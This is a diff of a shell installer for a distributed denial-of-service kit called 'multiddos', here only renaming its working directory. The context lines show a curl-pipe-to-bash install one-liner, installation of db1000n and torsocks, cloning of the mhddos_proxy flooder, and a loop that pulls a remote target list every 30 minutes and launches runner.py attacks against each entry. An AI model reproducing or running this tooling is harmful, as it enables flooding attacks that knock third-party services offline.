@@ -2,9 +2,9 @@
 # curl -L tiny.one/multiddos | bash && tmux a
 
 cd ~
-rm -rf multiddos
-mkdir multiddos
-cd multiddos
+rm -rf multidd
+mkdir multidd
+cd multidd
 
 gotop="on"
 db1000n="on"
@@ -99,7 +99,7 @@ sudo apt-get install -q -y tmux vnstat torsocks python3 python3-pip
 pip install --upgrade pip
 
 cat > auto_bash.sh << 'EOF'
-cd ~/multiddos/
+cd ~/multidd/
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
@@ -116,7 +116,7 @@ pkill -f start.py; pkill -f runner.py
       done
    for (( i=1; i<=list_size; i++ )); do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            python3 ~/multiddos/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
+            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
       done
 sleep 30m
 done
